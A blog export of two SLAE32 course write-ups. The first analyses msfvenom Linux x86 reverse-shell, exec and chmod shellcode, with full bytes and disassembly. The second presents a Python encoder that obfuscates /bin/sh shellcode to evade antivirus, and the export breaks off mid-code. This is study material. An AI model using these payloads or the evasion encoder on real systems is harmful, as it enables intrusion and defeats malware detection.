[{"content":" This post introduces the 5th mission to my SLAE32 journey.\nA cool task to see how a widely used tool by the offensive security community produces shellcode and compare it with my own developed ones. New tricks and new cool learned.\nIntroduction The SLAE32 5th assignment purpose is to select 3 msfvenom payloads and document my own analysis of them.\nFor this task I selected the following payloads:\nlinux/x86/shell_reverse_tcp linux/x86/exec linux/x86/chmod Shellcode 1 - linux/x86/shell_reverse_tcp I chose this one to compare the msfvenom shellcode to the code of my first assignment. I was curious to know if I wrote something similar or if there were some tricks that I could used to improve my shellcode knowledge.\nThe first step to do is geenrate the shellcode using MSF. As usual, let\u0026rsquo;s check its arguments\nmsfvenom -p linux/x86/exec --list-options\n-[~]$ msfvenom -p linux/x86/shell_reverse_tcp --list-options Options for payload/linux/x86/shell_reverse_tcp: ========================= Name: Linux Command Shell, Reverse TCP Inline Module: payload/linux/x86/shell_reverse_tcp Platform: Linux Arch: x86 Needs Admin: No Total size: 68 Rank: Normal Provided by: Ramon de C Valle \u0026lt;rcvalle@metasploit.com\u0026gt; joev \u0026lt;joev@metasploit.com\u0026gt; Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- CMD /bin/sh yes The command string to execute LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Description: Connect back to attacker and spawn a command shell With this information, we can generate our shellcode\n-[~]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=9001 -f c [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 68 bytes Final size of c file: 311 bytes unsigned char buf[] = \u0026#34;\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\u0026#34; \u0026#34;\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x7f\\x00\\x00\u0026#34; \u0026#34;\\x01\\x68\\x02\\x00\\x23\\x29\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\u0026#34; \u0026#34;\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\u0026#34; \u0026#34;\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026#34;; Using ndisasm:\necho -ne \u0026#34;\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x7f\\x00\\x00\\x01\\x68\\x02\\x00\\x23\\x29\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026#34; | ndisasm -u - 00000000 31DB xor ebx,ebx 00000002 F7E3 mul ebx 00000004 53 push ebx 00000005 43 inc ebx 00000006 53 push ebx 00000007 6A02 push byte +0x2 00000009 89E1 mov ecx,esp 0000000B B066 mov al,0x66 0000000D CD80 int 0x80 0000000F 93 xchg eax,ebx 00000010 59 pop ecx 00000011 B03F mov al,0x3f 00000013 CD80 int 0x80 00000015 49 dec ecx 00000016 79F9 jns 0x11 00000018 687F000001 push dword 0x100007f 0000001D 6802002329 push dword 0x29230002 00000022 89E1 mov ecx,esp 00000024 B066 mov al,0x66 00000026 50 push eax 00000027 51 push ecx 00000028 53 push ebx 00000029 B303 mov bl,0x3 0000002B 89E1 mov ecx,esp 0000002D CD80 int 0x80 0000002F 52 push edx 00000030 686E2F7368 push dword 0x68732f6e 00000035 682F2F6269 push dword 0x69622f2f 0000003A 89E3 mov ebx,esp 0000003C 52 push edx 0000003D 53 push ebx 0000003E 89E1 mov ecx,esp 00000040 B00B mov al,0xb 00000042 CD80 int 0x80 Filtering just by the assembly instruction with awk. The output is:\necho -ne \u0026#34;\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x7f\\x00\\x00\\x01\\x68\\x02\\x00\\x23\\x29\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026#34; | ndisasm -u - | awk \u0026#39;{ print $3,$4,$5 }\u0026#39; xor ebx,ebx mul ebx push ebx inc ebx push ebx push byte +0x2 mov ecx,esp mov al,0x66 int 0x80 xchg eax,ebx pop ecx mov al,0x3f int 0x80 dec ecx jns 0x11 push dword 0x100007f push dword 0x29230002 mov ecx,esp mov al,0x66 push eax push ecx push ebx mov bl,0x3 mov ecx,esp int 0x80 push edx push dword 0x68732f6e push dword 0x69622f2f mov ebx,esp push edx push ebx mov ecx,esp mov al,0xb int 0x80 Looking to the first syscall, we We can see the same syscall with value 0x66 or 102 in decimal is passed to eax. this corresponds to socketcall syscall as can be seen in the image below.\nA different from what was done in the first assignment. From analysing the code, using socketcall instead of calling the other 4 different syscalls seems to be a more clean and organized way to achieve the same result. The way socketcall works is by put a SYS_CALL value in ebx, store its arguments onto the stack and pointing ecx to esp which corresponds to the address where the beginning of the arguments are placed.\nLet\u0026rsquo;s separate the shellcode in \u0026ldquo;syscall pieces of code\u0026rdquo; by analysing each syscall and how the stack was organized.\n1 - Socketcall Syscall with SYS_SOCKET xor ebx,ebx mul ebx push ebx inc ebx push ebx push byte +0x2 mov ecx,esp mov al,0x66 int 0x80 Investigating the man page (man 2 socketcall) shows the structure as int socketcall(int call, unsigned long *args); .\ncall parameter determines which socket function to invoke. args points to a block containing the actual arguments, which are passed through to the appropriate call.\nLet\u0026rsquo;s check how the shellcode prepares the stack and then invokes socketcall.\nIt starts with the usual register clearing. In this case used xor ebx, ebx in conjunction with mul ebx to clear eax and edx. The advange or trick with this approach is to save one line of code.\nAfter that, ebx is pushed onto the stack. At this point, ebx has the value 0 which satisfies the protocol value needed for SYS_SOCKET. just a reminder for SYS_SOCKET structure: socket(PF_INET (2), SOCK_STREAM (1), IPPROTO_IP (0))\nThe same thing we\u0026rsquo;ve done when bulding our bind shell. This way pushing ebx the SOCK_STREAM argument is satisfied.\nNext, ebx is incremented which refers to the SYS_SOCKET argument we mentioned above. Then, 0x2 value which represents PF_INET is pushed tot eh stack to complete the task.\nLastly, teh address pointed by esp is passed to ecx as it references the arguments we have pushed on the stack. The last instruction (int 0x80) performs the interruption call. If successful sockfd file descriptor is stored in eax by default.\n2 - dup2() syscall xchg eax,ebx ; storing sockfd file descriptor in ebx pop ecx\t;puts 0x2 in ecx. this is going to be our coutner register mov al,0x3f ; moving dup2() syscall value to al register int 0x80 ; calling dup2() dec ecx ; decrement counter jns 0x11 ; jump near if not sign. Jumps if SF=0 From the code it calls dup2() instead of connect() which appears to be a different approachwe have performed before.\ndup2() takes sockfd file descriptor created from SYS_SOCKET interruption call and duplciates 0 (stdin),1 (stdout) and 2 (stderr) file descriptors using ecx register. This allows us to create an interactive shell.\nThe best part is how it handles the loop with the instruction jns 0x11.\nWhy 0x11?\nndisasm gives the answer.\n00000011 B03F mov al,0x3f 0x11 is a relative address or distance from the first instruction of the entire shellcode. So this will jump to 11 bytes after the first instruction (00000000 31DB xor ebx,ebx) if the loop condition is met.\n3 - socketcall with SYS_CONNECT Checking connect man page is has the following structure -\u0026gt; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);\nint sockfd is stored in ebx The struct structure is 0x100007f (127.0.0.1 - destination IP), 0x2923 (9001 - remote port) and AF_NET (2) push dword 0x100007f\t; pushing 127.0.0.1 remote IP push dword 0x29230002\t; pushing port 9001 and AF_INET mov ecx,esp ; pointing ecx to the top of the stack which where is the struct\u0026#39;s location mov al,0x66 ; moving socketcall() ssycall number to al register push eax push ecx ; push ; sockaddr_in* addr push ebx ; push sockfd mov bl,0x3 ; SYS_CONNECT mov ecx,esp int 0x80 After constructing the sockaddr struct it becames straightforward to call SYS_CONNECT.\n4 - Execve() The execve organization appears to have the same instruction has what has been done in previous assigments. Not a lot of difference should be from it in the MSF shellcode.\npush edx ; pushing a null terminator onto the stack push dword 0x68732f6e\t; pushing \u0026#39;hs//\u0026#39; onto the stack push dword 0x69622f2f\t; pushing \u0026#39;nib/\u0026#39; onto the stack mov ebx,esp ; storing the stack pointer to /bin//sh in ebx push edx ; pushing a null terminator to build another argument push ebx ; the /bin//sh stack pointer address we had stored in ebx mov ecx,esp ; pass to ecx the stack pointer for our arguments mov al,0xb ; execve syscall number int 0x80 Shellcode 2 - linux/x86/exec Firstly, let\u0026rsquo;s check the requried argumets for the exec shellcode with the command\nmsfvenom -p linux/x86/exec --list-options\n-[~]$ msfvenom -p linux/x86/exec --list-options Options for payload/linux/x86/exec: ========================= Name: Linux Execute Command Module: payload/linux/x86/exec Platform: Linux Arch: x86 Needs Admin: No Total size: 20 Rank: Normal Provided by: vlad902 \u0026lt;vlad902@gmail.com\u0026gt; Geyslan G. Bem \u0026lt;geyslan@gmail.com\u0026gt; Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- CMD no The command string to execute Description: Execute an arbitrary command or just a /bin/sh shell Generating our shellcode with msfvenom\n-[~]$ msfvenom -p linux/x86/exec CMD=whoami -f c [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 42 bytes Final size of c file: 201 bytes unsigned char buf[] = \u0026#34;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\u0026#34; \u0026#34;\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x07\\x00\\x00\u0026#34; \u0026#34;\\x00\\x77\\x68\\x6f\\x61\\x6d\\x69\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80\u0026#34;; Using ndisasm:\necho -ne \u0026#34;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x07\\x00\\x00\\x00\\x77\\x68\\x6f\\x61\\x6d\\x69\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80\u0026#34; | ndisasm -u - Output: 00000000 6A0B push byte +0xb 00000002 58 pop eax 00000003 99 cdq 00000004 52 push edx 00000005 66682D63 push word 0x632d 00000009 89E7 mov edi,esp 0000000B 682F736800 push dword 0x68732f 00000010 682F62696E push dword 0x6e69622f 00000015 89E3 mov ebx,esp 00000017 52 push edx 00000018 E807000000 call 0x24 0000001D 7768 ja 0x87 0000001F 6F outsd 00000020 61 popa 00000021 6D insd 00000022 6900575389E1 imul eax,[eax],dword 0xe1895357 00000028 CD80 int 0x80 using awk to filter the output just for the asse,bly instructions:\necho -ne \u0026#34;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x07\\x00\\x00\\x00\\x77\\x68\\x6f\\x61\\x6d\\x69\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80\u0026#34; | ndisasm -u - | awk \u0026#39;{ print $3,$4,$5 }\u0026#39; --------------------------------------- push byte +0xb\t; push execve syscall number to stack pop eax ; puts 0xb in eax. A trick to put a value into a register without using the mov instruction cdq ; Zeroes edx. Already used this is the first assigments push edx ; push null to the stack push word 0x632d\t; pushing the string for \u0026#39;-c\u0026#39; onto the stack which will be used along with \u0026#39;/bin/sh\u0026#39; to specify \u0026#39;whoami\u0026#39; command mov edi,esp ; store a stack pointer in edi to be used as an argument to execve push dword 0x68732f push dword 0x6e69622f\t; pushing \u0026#39;/bin/sh\u0026#39; onto the stack mov ebx,esp ; storing the stack pointer to ebx. To be used as an argument to execve as well push edx ; push null to the stack call 0x24 ; call here to the instruction at 0x20 which is \u0026#39;push edi\u0026#39; which we stored our stack pointer in ja 0x87 outsd popa insd imul eax,[eax],dword 0xe1895357 int 0x80 --------------------------------------------------- call 0x24 To understand better what this instruction is doing, i disassembled the shellcode in gdb. Looking to the calling address, it is calling to the \u0026lsquo;middle\u0026rsquo; of imul instruction which translates to push edi. By pushing edi we putting in the stack what we\u0026rsquo;ve stored there previously.\nThe instructions ja 0x87, outsd, popa, insd and imul eax,[eax],dword 0xe1895357 hide a very clever way to put our command (whoami) onto the stack.\nChecking the ndisasm output:\n0000001D 7768 ja 0x87 0000001F 6F outsd 00000020 61 popa 00000021 6D insd 00000022 6900575389E1 imul eax,[eax],dword 0xe1895357 If we convert the bold hex bytes we see whoami magically appear followed by a null byte (00).\nFrom cyberchef:\nAnd how this string in pushed onto the stack?\nCalling convetions is the answer. The call instruction will push the next instruction address to the stack. Similar to JMP-CALL-POP technique. That\u0026rsquo;s how our command is placed onto the stack.\nThe final result of the isntruction call 0x24 is to push the address of whoami address first (calling convention), and then push edi to the stack.\nThis way the stack is properly ordered as:\n0x632d ; -c 0x77686f616d6900 ; whoam But that\u0026rsquo;s not all. We need to know what are the last two bytes (89E1) from 6900575389E1 imul eax,[eax],dword 0xe1895357 purpose.\nUsing this online disassembler those instructions are translated to:\nmov ecx, esp We mov the address pointed by the top of the stack ecx which is thr second argument for exec syscall. The same way passes to the stack the the command '/bin/sh -c whoami'.\nAfter this, all argumets are pushed onto the stack. Just left execute the syscall with:\nint 0x80 Shellcode 3 - linux/x86/chmod The last shellcode is linux/x86/chmod. Checking its arguments in msfvenom.\nmsfvenom -p linux/x86/chmod --list-options\n-[~]$ msfvenom -p linux/x86/chmod --list-options Options for payload/linux/x86/chmod: ========================= Name: Linux Chmod Module: payload/linux/x86/chmod Platform: Linux Arch: x86 Needs Admin: No Total size: 36 Rank: Normal Provided by: kris katterjohn \u0026lt;katterjohn@gmail.com\u0026gt; Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- FILE /etc/shadow yes Filename to chmod MODE 0666 yes File mode (octal) Description: Runs chmod on specified file with specified mode So this has two options we have to provide. The file that we want to alter, and the and the chmod mode we want to make it. I will create a file within ~/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis directory, and chmod it to be an executable.\n-r--r----- 1 edu edu 0 Nov 24 14:23 test.txt sudo msfvenom -p linux/x86/chmod FILE=/home/edu/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis/test.txt MODE=0777 -f c Output:\n-[~]$ msfvenom -p linux/x86/chmod FILE=/home/edu/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis/test.txt MODE=0777 -f c [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 98 bytes Final size of c file: 437 bytes unsigned char buf[] = \u0026#34;\\x99\\x6a\\x0f\\x58\\x52\\xe8\\x4a\\x00\\x00\\x00\\x2f\\x68\\x6f\\x6d\u0026#34; \u0026#34;\\x65\\x2f\\x65\\x64\\x75\\x2f\\x44\\x65\\x73\\x6b\\x74\\x6f\\x70\\x2f\u0026#34; \u0026#34;\\x73\\x6c\\x61\\x65\\x5f\\x78\\x38\\x36\\x2f\\x61\\x73\\x73\\x69\\x67\u0026#34; \u0026#34;\\x6e\\x6d\\x65\\x6e\\x74\\x73\\x2f\\x35\\x2d\\x4d\\x53\\x46\\x5f\\x53\u0026#34; \u0026#34;\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65\\x73\\x5f\\x41\\x6e\\x61\\x6c\u0026#34; \u0026#34;\\x79\\x73\\x69\\x73\\x2f\\x74\\x65\\x73\\x74\\x2e\\x74\\x78\\x74\\x00\u0026#34; \u0026#34;\\x5b\\x68\\xff\\x01\\x00\\x00\\x59\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80\u0026#34;; Using ndisasm:\necho -ne \u0026#34;\\x99\\x6a\\x0f\\x58\\x52\\xe8\\x4a\\x00\\x00\\x00\\x2f\\x68\\x6f\\x6d\\x65\\x2f\\x65\\x64\\x75\\x2f\\x44\\x65\\x73\\x6b\\x74\\x6f\\x70\\x2f\\x73\\x6c\\x61\\x65\\x5f\\x78\\x38\\x36\\x2f\\x61\\x73\\x73\\x69\\x67\\x6e\\x6d\\x65\\x6e\\x74\\x73\\x2f\\x35\\x2d\\x4d\\x53\\x46\\x5f\\x53\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65\\x73\\x5f\\x41\\x6e\\x61\\x6c\\x79\\x73\\x69\\x73\\x2f\\x74\\x65\\x73\\x74\\x2e\\x74\\x78\\x74\\x00\\x5b\\x68\\xff\\x01\\x00\\x00\\x59\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80\u0026#34; | ndisasm -u - 00000000 99 cdq 00000001 6A0F push byte +0xf 00000003 58 pop eax 00000004 52 push edx 00000005 E84A000000 call 0x54 0000000A 2F das 0000000B 686F6D652F push dword 0x2f656d6f 00000010 6564752F fs jnz 0x43 00000014 44 inc esp 00000015 65736B gs jnc 0x83 00000018 746F jz 0x89 0000001A 702F jo 0x4b 0000001C 736C jnc 0x8a 0000001E 61 popa 0000001F 655F gs pop edi 00000021 7838 js 0x5b 00000023 362F ss das 00000025 61 popa 00000026 7373 jnc 0x9b 00000028 69676E6D656E74 imul esp,[edi+0x6e],dword 0x746e656d 0000002F 732F jnc 0x60 00000031 352D4D5346 xor eax,0x46534d2d 00000036 5F pop edi 00000037 53 push ebx 00000038 68656C6C63 push dword 0x636c6c65 0000003D 6F outsd 0000003E 6465735F gs jnc 0xa1 00000042 41 inc ecx 00000043 6E outsb 00000044 61 popa 00000045 6C insb 00000046 7973 jns 0xbb 00000048 69732F74657374 imul esi,[ebx+0x2f],dword 0x74736574 0000004F 2E7478 cs jz 0xca 00000052 7400 jz 0x54 00000054 5B pop ebx 00000055 68FF010000 push dword 0x1ff 0000005A 59 pop ecx 0000005B CD80 int 0x80 0000005D 6A01 push byte +0x1 0000005F 58 pop eax 00000060 CD80 int 0x80 Filtering just by the assembly instruction with awk. The output is:\necho -ne \u0026#34;\\x99\\x6a\\x0f\\x58\\x52\\xe8\\x4a\\x00\\x00\\x00\\x2f\\x68\\x6f\\x6d\\x65\\x2f\\x65\\x64\\x75\\x2f\\x44\\x65\\x73\\x6b\\x74\\x6f\\x70\\x2f\\x73\\x6c\\x61\\x65\\x5f\\x78\\x38\\x36\\x2f\\x61\\x73\\x73\\x69\\x67\\x6e\\x6d\\x65\\x6e\\x74\\x73\\x2f\\x35\\x2d\\x4d\\x53\\x46\\x5f\\x53\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65\\x73\\x5f\\x41\\x6e\\x61\\x6c\\x79\\x73\\x69\\x73\\x2f\\x74\\x65\\x73\\x74\\x2e\\x74\\x78\\x74\\x00\\x5b\\x68\\xff\\x01\\x00\\x00\\x59\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80\u0026#34; | ndisasm -u - | awk \u0026#39;{print $3,$4,$5}\u0026#39; cdq ; zeroes edx push byte +0xf\t; push 0xf --\u0026gt; chmod syscall number pop eax ; put 0xf in eax push edx ; push a null onto the stack call 0x54 ; pushes next instruction address (\u0026#34;push dword 0x2f656d6f\u0026#34;) and jumps execution to the instruction placed 0x54 bytes relative to the start of the shellcode \u0026#34;; start of the test.txt path bytes\u0026#34; das push dword 0x2f656d6f fs jnz 0x43 inc esp gs jnc 0x83 jz 0x89 jo 0x4b jnc 0x8a popa gs pop edi js 0x5b ss das popa jnc 0x9b imul esp,[edi+0x6e],dword 0x746e656d jnc 0x60 xor eax,0x46534d2d pop edi push ebx push dword 0x636c6c65 outsd gs jnc 0xa1 inc ecx outsb popa insb jns 0xbb imul esi,[ebx+0x2f],dword 0x74736574 cs jz 0xca jz 0x54 \u0026#34;end of test.txt string bytes\u0026#34; \u0026#34;; start of decode stub\u0026#34; pop ebx push dword 0x1ff pop ecx int 0x80 push byte +0x1 pop eax int 0x80 This instructions purpose are not to be \u0026ldquo;real\u0026rdquo; instructions or obfuscated code. It\u0026rsquo;s simply /home/eduardo/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis/test.txt string bytes that were placed in memory which represent the correpondent assembly instructions.\nMoving to 0x54 bytes from the beggining, we jmp to the instruction pop ebx. This is where the decode stub is placed.\nYou can check the first ndisasm output and see\n00000054 5B pop ebx From there, file path bytes are decoded and chmod is executed.\npop ebx ; execution is redirected to here. Store stack pointers of /home/eduardo/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis/test.txt in ebx (1st arg) push dword 0x1ff\t; pushes the permissions or MODE parameter to be changed in the file pointed by ebx. 0x1ff (hex) = 777 (octal) pop ecx ; stores 0x1ff in ecx which is the 2chmod\u0026#39;s 2nd arg int 0x80 ; calls chmod push byte +0x1\t; pushes onto the stack the exit syscalll number pop eax ; stores x01 in eax int 0x80\t; calls exit Lessons learned The best trick I saw was to place string bytes as assembly isntructions and then decode them in runtime. In fact, is similar to the encoder lesson from the course but the methodology is applied in a different way.\nAn example on how to think outside the box and how we cane be creative if we put some effort on that.\nA apart from that, the shellcodes had many null-bytes but the real outcome how after doing the full analysis of the shellcodes in this blog post. My curiosity talk louder and I tried generating these payloads using null bytes as badchars.\nFor my surprise, I noticed some of the null bytes were being introducing by local jumps using the call instruction with jmp-call-pop technique. This technique was replaced by the fnstenv technique which was mentioned in one of the challenges placed during the course.\nThis way we can store the address of the next instruction in the FPU stack and avoid introducing null bytes with call instruction.\nThe most important one: this assignment remembered me how we can learn from reading not just shellcode but any code from other languages written by others.\nA lesson that we can apply to any other task in other area (hardware, cooking, communication, etc).\nDoing that we can learn new techniques, new ways to think when we face a problem and be more efficient in any task during our life.\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86\n","permalink":"https://0xnibbles.github.io/posts/slae_32_assignment_5/","summary":"This post introduces the 5th mission to my SLAE32 journey.\nA cool task to see how a widely used tool by the offensive security community produces shellcode and compare it with my own developed ones. New tricks and new cool learned.\nIntroduction The SLAE32 5th assignment purpose is to select 3 msfvenom payloads and document my own analysis of them.\nFor this task I selected the following payloads:\nlinux/x86/shell_reverse_tcp linux/x86/exec linux/x86/chmod Shellcode 1 - linux/x86/shell_reverse_tcp I chose this one to compare the msfvenom shellcode to the code of my first assignment.","title":"SLAE32 Assignment 5 - Msfvenom Shellcode Analysis"},{"content":" This post introduces the forth mission to my SLAE32 journey.\nA really really handful and challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as FlipRotation Shellcode\nIntroduction The forth assignment goal was to create my own custom encoder and decoder of the execve stack shellcode. AS ou may know, the purpose is to execute /bin/sh A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).\nFlipRotation Algorithm Overview The inspiration for this algorithm was the known CBC bit-flipping attack but appliyng a simple variation to our context.\nMore specifically, the steps are\nWe pick each shelcode byte and flip the last bit using a xor operation - flipped_shellbyte = shellbyte ^ 0x01 Based on that output the rotation direction is defined. We rotate right if odd or left if even. The number of rotation positions is defined by the loop index value (number of interations) of the loop at that time. If we rotate right we append 0x2 afther the encoded byte and if we rotate left we append 0xff Put the byte 0xa0 as the shellcode end marker The follwoing diagram can help to understand better this process.\nRegarding decoding, it is just simply reverting the steps and we have our original shellcode back.\nFrom my experience developing the decoder in assembly was much simpler than implementing the encoder login in Python.\nEncoder The FlipRotation encoder was developed in Python language. The Encoder class supports various encoding modes but we will focused only in insertion mode.\nFlipRotation Encoder #!/usr/bin/python3 # # The FlipRotation Shellcode encoder # # Rotates back and flips the lowest bit of each byte. # import argparse import secrets import logging import sys secretsGenerator = secrets.SystemRandom() c_style_shellcode = (b\u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026#34;) # bin/sh def banner(): print(\u0026#39;\u0026#39;\u0026#39; _______________________________________________________________ \u0026lt;The \u0026#34;FlipRotation\u0026#34; Encoder - Bit flip and rotate your shellcode --------------------------------------------------------------- \\ ^__^ \\ (oo)\\_______ (__)\\ )\\/\\\\ ||----w | || || \u0026#39;\u0026#39;\u0026#39;) #---------------------------- def bin2hex(binstr): return hex(int(binstr,2)) class Encoder: def randomKeyGenerator(self): byte = \u0026#39;0x\u0026#39; for i in range(2): hexDigits = [0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f] nibble = secretsGenerator.choice(hexDigits) # it gets in decimal not hex format byte = byte + hex(nibble)[2:] # hex class is str type. Appending to 0x return int(byte,16) # convert key to bytes and return def __init__(self,enc_type, key=None): if enc_type != \u0026#34;not\u0026#34;: if key is not None: self.key = key print(\u0026#34;[*] Key Provided by the user. Doing magic with it\u0026#34;) else: self.key = self.randomKeyGenerator() print(\u0026#34;[*] Doing magic with a (pseudo) Random key\u0026#34;) print(\u0026#34;[*] Key: \u0026#34;+hex(self.key)) # Function to left # rotate n by d bits def leftRotate(self,shellbits, d): tmp = shellbits[d:] + shellbits[0:d] return tmp # Function to right # rotate n by d bits def rightRotate(self, shellbits, d): return self.leftRotate(shellbits, len(shellbits) - d) def insertion_encode(self, shellcode): encoded = \u0026#39;\u0026#39; # 0x format encoded2 = \u0026#39;\u0026#39; # \\x format rotation_direction = \u0026#39;\u0026#39; rotation_counter = 0 for shellbyte in shellcode: flipped_shellbyte = shellbyte ^ 0x01 # flip lowest bit if bin(flipped_shellbyte)[-1] == \u0026#39;0\u0026#39;: logging.info(\u0026#34;Flipped byte - odd - \u0026#34;+str(flipped_shellbyte)) rotated_shellbyte = self.rightRotate(format(flipped_shellbyte,\u0026#39;08b\u0026#39;),rotation_counter% 8 ) # 8 because we are rotating with 8 bits rotation_direction = \u0026#39;0x02\u0026#39; else: logging.info(\u0026#34;Flipped byte - even - \u0026#34;+str(flipped_shellbyte)) rotated_shellbyte = self.leftRotate(format(flipped_shellbyte,\u0026#39;08b\u0026#39;),rotation_counter% 8 ) # 8 because we are rotating with 8 bits print(\u0026#34;After rotation: \u0026#34;+ bin2hex(self.leftRotate(format(flipped_shellbyte,\u0026#39;08b\u0026#39;),rotation_counter%8))) rotation_direction = \u0026#39;0xff\u0026#39; final_shellbyte = bin2hex(rotated_shellbyte) rotation_counter += 1 encoded += final_shellbyte + \u0026#39;,\u0026#39; + rotation_direction +\u0026#39;,\u0026#39; # \\x format encoded2 += \u0026#39;\\\\x\u0026#39; + final_shellbyte[2:] + \u0026#39;\\\\x\u0026#39; + rotation_direction[2:] # \\x format print(\u0026#34;\\n[*] \\\\x format: \u0026#34;) encoded2 += \u0026#39;\\\\x\u0026#39; + hex(self.key)[2:] # add marker print(encoded2) print(\u0026#34;\\n[*] 0x format: \u0026#34;) encoded += \u0026#39;0x\u0026#39; + hex(self.key)[2:] + \u0026#39;,\u0026#39; + \u0026#39;0x\u0026#39; + hex(self.key)[2:] #add marker print(encoded) def main(): shellcode = bytearray(c_style_shellcode) print(\u0026#34;[*] Shellcode length: \u0026#34;+str(len(shellcode))+\u0026#34;\\n\u0026#34;) print(\u0026#34;[*] Shellcode: \u0026#34;+str(c_style_shellcode)+\u0026#34;\\n\u0026#34;) # -------------------KEY-------------- key = 0xa0 # can\u0026#39;t be 0x02 or 0xff. used for rotation direction ##################################### # -------------Encode Type----------- enc_type = \u0026#34;insertion\u0026#34; ##################################### if enc_type == \u0026#34;not\u0026#34;: encoder = Encoder(enc_type) encoder.complement_encoding(shellcode) elif enc_type == \u0026#34;xor\u0026#34;: encoder = Encoder(enc_type, key) encoder.xor_encoding_backslashX(shellcode)# utf-8 encoding (\\x4b,\\xe4,...) encoder.xor_encoding_0x(shellcode) # hex format (0x4b, 0xe4,...) elif enc_type == \u0026#34;insertion\u0026#34;: encoder = Encoder(enc_type, key) # providing a key with insertion encoding type encoder.insertion_encode(shellcode) # call insertion code with target shellcode as argument else: print(\u0026#34;[*] Encode type not supported. Please check the supported algorithms in the help menu\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: banner() # displays the program banner main() print(\u0026#34;\\n--------------------\u0026#34;) print(\u0026#34;[*] Hack the World!\u0026#34;) print(\u0026#34;--------------------\u0026#34;) print() print() The Encoder class is is able to generate a pseudorandom key or use one provided by the user.\ndef randomKeyGenerator(self): byte = \u0026#39;0x\u0026#39; for i in range(2): hexDigits = [0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f] nibble = secretsGenerator.choice(hexDigits) # it gets in decimal not hex format #print(\u0026#34;nibble----\u0026#34;+hex(nibble)[2:]) byte = byte + hex(nibble)[2:] # hex class is str type. Appending to 0x #print(byte) #chr(int(byte,16)) # converts from base 16 to integer (decimal) and then to ascii (chr func) #print(int(byte,16)) return int(byte,16) # convert key to bytes and return def __init__(self,enc_type, key=None): if enc_type != \u0026#34;not\u0026#34;: if key is not None: self.key = key print(\u0026#34;[*] Key Provided by the user. Doing magic with it\u0026#34;) else: self.key = 